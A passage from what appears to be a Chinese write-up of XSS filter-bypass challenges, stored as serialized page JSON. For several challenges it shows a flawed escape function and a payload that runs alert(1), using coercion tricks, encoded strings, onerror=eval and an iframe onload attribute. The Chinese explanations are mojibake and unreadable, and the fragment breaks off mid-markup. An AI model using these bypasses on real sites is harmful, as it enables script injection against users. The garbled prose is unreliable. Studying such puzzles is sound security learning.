¼æ˜¯è¯´ï¼Œå·¦è¾¹çš„è¾“å…¥æ˜¯å¯ä»¥è¿”å›å³è¾¹çš„å­—ç¬¦ä¸²çš„ã€‚å¤§å®¶å¯ä»¥åœ¨è¯•è¯•ã€‚\\næ‰€ä»¥å¯ä»¥ç”¨è¿™ä¸ªåŠæ³•æ¥è·å–æˆ‘ä»¬éœ€è¦çš„å­—ç¬¦ä¸²\\n\",[\"$\",\"img\",null,{\"src\":\"/images/2.png\",\"alt\":\"\"}],\"\\næ‰€ä»¥æœ€åçš„payload(246):\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"+[][(''+!1)[3]+(''+{})[1]+(''+!0)[1]+(''+!0)[0]][(''+{})[5]+(''+{})[1]+(''+{}[0])[1]+(''+!1)[3]+(''+!0)[0]+(''+!0)[1]+(''+!0)[2]+(''+{})[5]+(''+!0)[0]+(''+{})[1]+(''+!0)[1]]((''+!1)[1] + (''+!1)[2] + (''+!1)[4] +(''+!0)[1]+(''+!0)[0]+\\\"\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1\"}],\")\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\")())//`\\n\"}]]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"å¦‚æœæŠŠæˆ‘ä»¬æ‰€éœ€è¦çš„å­—æ¯éƒ½èµ‹ç»™ä¸€ä¸ªå˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªpayloadå¯ä»¥æ›´çŸ­ä¸€äº›\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[\"_=\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"''\"}],\"+!\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"1\"}],\"+!\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0\"}],\"+{}[\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0\"}],\"]+{}  \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"//_=\\\"falsetrueundefined[object Object]\\\"\"}],\"\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"æ‰€ä»¥payloadå¯ä»¥ç¼©çŸ­æˆ144ä¸ªå­—ç¬¦ï¼š\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\");_=''+!1+!0+{}[0]+{};[][_[3]+_[19]+_[6]+_[5]][_[23]+_[19]+_[10]+_[3]+_[5]+_[6]+_[7]+_[23]+_[5]+_[19]+_[6]](_[1]+_[2]+_[4]+_[6]+_[5]+'(1)')()//\\n\"}]}]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"rfc4627\",\"children\":\"RFC4627\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"text\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" i = \",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0\"}],\";\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"window\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"the_easy_but_expensive_way_out\"}],\" = \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\"}],\") { \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"alert\"}],\"(i++) };\\n\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// \\\"A JSON text can be safely passed into JavaScript's eval() function\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// (which compiles and executes a string) if all the characters not\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// enclosed in strings are in the set of characters that form JSON\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// tokens.\\\"\"}],\"\\n\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (!(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/[^,:{}\\\\[\\\\]0-9.\\\\-+Eaeflnr-u \\\\n\\\\r\\\\t]/\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"test\"}],\"(\\n          text.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/\\\"(\\\\\\\\.|[^\\\"\\\\\\\\])*\\\"/g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"''\"}],\")))) {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"try\"}],\" {\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" val = \",[\"$\",\"span\",null,{\"className\":\"hljs-built_in\",\"children\":\"eval\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'('\"}],\" + text + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"')'\"}],\");\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"console\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"log\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"''\"}],\" + val);\\n    } \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"catch\"}],\" (_) {\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"console\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"log\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'Crashed: '\"}],\"+_);\\n    }\\n  } \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"else\"}],\" {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"console\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"log\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'Rejected.'\"}],\");\\n  }\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"æ®è¯´è¿™é¢˜æ˜¯åŸºäºçœŸå®çš„æ¡ˆä¾‹ï¼Œ\",[\"$\",\"a\",null,{\"href\":\"https://twitter.com/WisecWisec\",\"children\":\"Stefano Di Paola\"}],\"è®°è½½åœ¨è¿™ç¯‡\",[\"$\",\"a\",null,{\"href\":\"http://blog.mindedsecurity.com/2011/08/ye-olde-crockford-json-regexp-is.html\",\"children\":\"æ–‡ç« \"}],\"ä¸­ã€‚\\nä»”ç»†çœ‹ä¸€ä¸‹è¿™ä¸ªè¡¨è¾¾å¼ï¼Œå®ƒæ˜¯å…è®¸æˆ‘ä»¬è¾“å…¥\",[\"$\",\"code\",null,{\"children\":\"self\"}],\"çš„ï¼Œå¦‚æœæ˜¯è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡å®ƒæ¥è°ƒç”¨å…¨å±€å‡½æ•°\",[\"$\",\"code\",null,{\"children\":\"the_easy_but_expensive_way_out\"}],\"äº†ã€‚\\nè¿™é¢˜çš„æŠ€å·§å°±æ˜¯è®©ä¸€ä¸ªå¯¹è±¡å’Œä¸€ä¸ªå€¼æˆ–è€…ä¸€ä¸ªå­—ç¬¦ç›¸åŠ ã€‚è¿™æ ·JSå¼•æ“å°±ä¼šå»è®¡ç®—æˆ‘ä»¬çš„å¯¹è±¡çš„å€¼ï¼Œæ€ä¹ˆè®¡ç®—å‘¢ï¼Ÿå°±æ˜¯è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„\",[\"$\",\"code\",null,{\"children\":\"valueOf\"}],\"æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬å°†valueOfæ–¹æ³•å®šä¹‰ä¸ºé¢˜ç›®ä¸­çš„\",[\"$\",\"code\",null,{\"children\":\"the_easy_but_expenssive_way_out\"}],\"ï¼Œï¼Œå°±å¯ä»¥è§¦å‘alertå‡½æ•°äº†ï¼Œä½†æ˜¯ç”±äºæ˜¯alert(i++)ï¼Œiä»0å¼€å§‹ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦è°ƒç”¨ä¸¤æ¬¡ã€‚\\nsolution(103): \",[\"$\",\"code\",null,{\"children\":\"{\\\"valueOf\\\":self[\\\"the_easy_but_expensive_way_out\\\"]}+0,{\\\"valueOf\\\":self[\\\"the_easy_but_expensive_way_out\\\"]}\"}],\"\\néœ€è¦æé†’çš„æ˜¯ï¼Œç¬¬ä¸€æ¬¡æ˜¯ç”±\",[\"$\",\"code\",null,{\"children\":\"eval\"}],\"è°ƒç”¨ï¼Œç¬¬äºŒæ¬¡æ˜¯ç”±\",[\"$\",\"code\",null,{\"children\":\"console.log\"}],\"è°ƒç”¨ã€‚\"]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"brunn\",\"children\":\"Brunn\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-attr\",\"children\":\"http\"}],\":\",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"//www.avlidienbrunn.se/xsschallenge/\"}],\"\\n\\n  s = s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/[\\\\r\\\\n\\\\u2028\\\\u2029\\\\\\\\;,()\\\\[\\\\]\u003c]/g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"''\"}],\");\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"\u003cscript\u003e var email = '\\\"\"}],\" + s + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\"'; \u003c\\\\/script\u003e\\\"\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"åˆ†å·å°–æ‹¬å·éƒ½è¢«è¿‡æ»¤æ‰äº†ï¼Œæ‰€ä»¥æ™®é€šçš„åŠæ³•æ˜¯æ— æ•ˆçš„ã€‚ä½†æ˜¯ä¸Šä¸€é¢˜çš„æ–¹æ³•è¿˜æ˜¯æœ‰ç”¨ã€‚\\næ‰€ä»¥åº”è¯¥æ„é€ çš„payloadæ˜¯ï¼š\\n\",[\"$\",\"code\",null,{\"children\":\"'+{valueOf:Function('alert(1)')}//\"}],\"\\næˆ–è€…\",[\"$\",\"code\",null,{\"children\":\"'+{valueOf:function(){alert(1)}}//\"}],\"\\næˆ–è€…\",[\"$\",\"code\",null,{\"children\":\"'+{valueOf:()=\u003e{alert(1)}}//\"}],\"\\næˆ–è€…\",[\"$\",\"code\",null,{\"children\":\"'+{valueOf:a=\u003e{alert(1)}}//\"}],\"\\nä½†æ˜¯æœ‰æ–°çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯ä¸èƒ½ä½¿ç”¨å°æ‹¬å·å’Œä¸­æ‹¬å·ã€‚\\nå¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ç”¨\",[\"$\",\"a\",null,{\"href\":\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals#Tagged_template_literals\",\"children\":\"Tag Function\"}],\"æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚\\nsolution(85):\"]}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'+{valueOf:Function`a${'\"}],\"alert\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'+String.fromCharCode`40`+1+String.fromCharCode`41`}`}//\\n\"}]]}]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"no\",\"children\":\"No\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// submitted by Stephen Leppik\"}],\"\\n\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n    s = s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/[()`\u003c]/g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"''\"}],\"); \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// no function calls\"}],\"\\n\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003e\\\\n'\"}],\" +\\n           \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'var string = \\\"'\"}],\" + s + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\";\\\\n'\"}],\" +\\n           \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'console.log(string);\\\\n'\"}],\" +\\n           \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003c/script\u003e'\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"å‚è€ƒèµ„æ–™ï¼š\",[\"$\",\"a\",null,{\"href\":\"http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/\",\"children\":\"XSS technique without parentheses\"}],\"\\nsolution(39): \",[\"$\",\"code\",null,{\"children\":\"\\\";onerror=eval;throw'=alert\\\\x281\\\\x29'//\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"kzk\",\"children\":\"K'Z'K\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// submitted by Stephen Leppik\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// remove vowels in honor of K'Z'K the Destroyer\"}],\"\\n    s = s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/[aeiouy]/gi\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"''\"}],\");\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003econsole.log(\\\"'\"}],\" + s + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\");\u003c/script\u003e'\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™ä¸ªé¢˜è¦ç”¨çš„åŠæ³•è¿˜æ˜¯å’Œé¢˜ç›®ä¸€æ ·Skandia ][]ï¼Œä½†æ˜¯ä¸ç”¨å…¨éƒ¨éƒ½ç”¨å…«è¿›åˆ¶æ¥æ›¿æ¢ï¼Œåªè¦æ›¿æ¢æ‰å…ƒéŸ³å­—æ¯å°±å¯ä»¥äº†ã€‚\\nsolution(60):  \",[\"$\",\"code\",null,{\"children\":\"\\\",[][\\\"p\\\\x6fp\\\"][\\\"c\\\\x6fnstr\\\\x75ct\\\\x6fr\\\"]('\\\\x61l\\\\x65rt(1)')(),\\\"\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"kzk-1\",\"children\":\"K'Z'K\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// submitted by Stephen Leppik\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// remove vowels and escape sequences in honor of K'Z'K\"}],\"\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// y is only sometimes a vowel, so it's only removed as a literal\"}],\"\\n    s = s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/[aeiouy]|\\\\\\\\((x|u00)([46][159f]|[57]5)|1([04][15]|[15][17]|[26]5))/gi\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"''\"}],\")\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// remove certain characters that can be used to get vowels\"}],\"\\n    s = s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/[{}!=\u003c\u003e]/g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"''\"}],\");\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003econsole.log(\\\"'\"}],\" + s + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\");\u003c/script\u003e'\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™é¢˜æœ‰ä¸ªæ­£åˆ™æ›¿æ¢ï¼Œå°†æˆ‘ä»¬çš„å…«è¿›åˆ¶æˆ–è€…åå…­è¿›åˆ¶éƒ½ç»™æ›¿æ¢æˆç©ºäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ç»“åˆä¸Šä¸€é¢˜çš„åšæ³•å’Œé¢˜ç›®JSON ][çš„æ–¹æ³•å°±å¯ä»¥äº†ã€‚\\nsolution(85): \",[\"$\",\"code\",null,{\"children\":\"\\\");[][\\\"p\\\\x\\\\x6f6fp\\\"][\\\"c\\\\x\\\\x6f6fnstr\\\\x\\\\x7575ct\\\\x\\\\x6f6fr\\\"]('\\\\x\\\\x6161l\\\\x\\\\x6565rt(1)')()//\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"kzk-2\",\"children\":\"K'Z'K\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// submitted by Stephen Leppik\"}],\"\\n\",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// remove vowels in honor of K'Z'K the Destroyer\"}],\"\\n    s = s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/[aeiouy]/gi\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"''\"}],\");\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-comment\",\"children\":\"// remove certain characters that can be used to get vowels\"}],\"\\n    s = s.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"replace\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-regexp\",\"children\":\"/[{}!=\u003c\u003e\\\\\\\\]/g\"}],\", \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"''\"}],\");\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\u003cscript\u003econsole.log(\\\"'\"}],\" + s + \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'\\\");\u003c/script\u003e'\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":\"è¿™é¢˜å¤æ‚ä¸€ç‚¹ï¼Œæ²¡æƒ³åˆ°å¥½åŠæ³•ã€‚æ‰€ä»¥è¿˜æ˜¯ç”¨è€åŠæ³•ã€‚\\nsolution(190):\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"\\\");[]['m'+(++[][[]]+[])[1]+'p']['c'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'nstr'+([][[]]+[])[0]+'ct'+([]['m'+(++[][[]]+[])[1]+'p']+[])[6]+'r']((++[][[]]+[])[1]+'l'+([][[]]+[])[3]+'rt(1)')()//\\n\"}]}]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"fruit-1\",\"children\":\"Fruit 1\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs language-js\",\"children\":[[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"escape\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"s\"}],\") {\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" div = \",[\"$\",\"span\",null,{\"className\":\"hljs-variable language_\",\"children\":\"document\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"implementation\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"createHTMLDocument\"}],\"().\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"createElement\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'div'\"}],\");\\n  div.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"innerHTML\"}],\" = s;\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"function\"}],\" \",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"f\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-params\",\"children\":\"n\"}],\") {\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'SCRIPT'\"}],\" === n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"tagName\"}],\") n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"parentNode\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"removeChild\"}],\"(n);\\n    \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"for\"}],\" (\",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" i=\",[\"$\",\"span\",null,{\"className\":\"hljs-number\",\"children\":\"0\"}],\"; i\u003cn.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"attributes\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"length\"}],\"; i++) {\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"var\"}],\" name = n.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"attributes\"}],\"[i].\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"name\"}],\";\\n      \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"if\"}],\" (name !== \",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'class'\"}],\") { n.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"removeAttribute\"}],\"(name); }\\n    }\\n  }\\n  [].\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"map\"}],\".\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"call\"}],\"(div.\",[\"$\",\"span\",null,{\"className\":\"hljs-title function_\",\"children\":\"querySelectorAll\"}],\"(\",[\"$\",\"span\",null,{\"className\":\"hljs-string\",\"children\":\"'*'\"}],\"), f);\\n  \",[\"$\",\"span\",null,{\"className\":\"hljs-keyword\",\"children\":\"return\"}],\" div.\",[\"$\",\"span\",null,{\"className\":\"hljs-property\",\"children\":\"innerHTML\"}],\";\\n}\\n\"]}]}],\"\\n\",[\"$\",\"p\",null,{\"children\":[\"è¿™ä¸ªé¢˜ç›®çš„æ¼æ´æ¥æºäºä»£ç çš„é€»è¾‘ä¸ä¸¥è°¨ã€‚\\nå…³é”®åœ¨äºç¬¬6è¡Œä¸­çš„\",[\"$\",\"code\",null,{\"children\":\"i\u003cn.attributes.length\"}],\"ï¼Œä½†æ˜¯è¿™ä¸ªlengthæ˜¯åŠ¨æ€å˜åŒ–çš„ï¼Œå¯¼è‡´å¦‚æœæœ‰å¤šä¸ªå±æ€§çš„æ—¶å€™ï¼Œå°±è¿˜å‰©ä¸‹ä¸€ä¸ªå±æ€§æ˜¯åˆ ä¸æ‰äº†ã€‚\\nè¿™æ ·çš„è¯æˆ‘ä»¬å°±æ„é€ å¤šä¸ªå±æ€§å¥½äº†ï¼Œå°†\",[\"$\",\"code\",null,{\"children\":\"onload=alert(1)\"}],\"æ”¾åé¢ã€‚\\nsolution(26): \",[\"$\",\"code\",null,{\"children\":\"\u003ciframe t onload=alert(1)\u003e\"}]]}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"br\",null,{}],\"\\n\",[\"$\",\"h1\",null,{\"id\":\"fruit-2\",\"children\":\"Fruit 2\"}],\"\\n\",[\"$\",\"pre\",null,{\"children\":[\"$\",\"code\",null,{\"className\":\"hljs 